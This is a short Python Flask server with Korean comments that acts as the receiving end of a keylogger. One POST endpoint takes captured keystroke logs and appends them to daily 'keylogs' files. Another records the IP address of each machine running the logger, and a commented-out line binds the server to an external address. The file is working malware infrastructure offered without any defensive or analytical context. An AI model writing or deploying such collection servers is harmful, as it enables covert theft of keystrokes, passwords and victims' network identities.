from flask import *
from datetime import datetime


app = Flask(__name__)

# 키로그 받아오기
@app.route('/get_logs', methods = ['POST'])
def get_logs():
    logs = request.form['logs']
    # if day != day
    day = datetime.now().strftime("%Y-%m-%d")
    with open(day + '- keylogs.txt', 'a') as f:
        
        f.write(f'{datetime.now()} - {logs}\n')
        # 아이피 받아오기
        # 로그 파일 날짜로 생성 o

        return {'result': True}


#실행한 IP 받아오기
@app.route('/get_IP', methods = ['POST'])
def get_IP():
    ip = request.form['ip']
    day = datetime.now().strftime("%Y-%m-%d")
    with open(day + ' - loginIP.txt', 'a') as i:

        i.write(f'{datetime.now()} - {ip}\n')

        return {'result': True}
        
if __name__ == "__main__":
    app.run(debug=True)
    # app.run(host= "198.124.7.1", port="8000", debug=True)
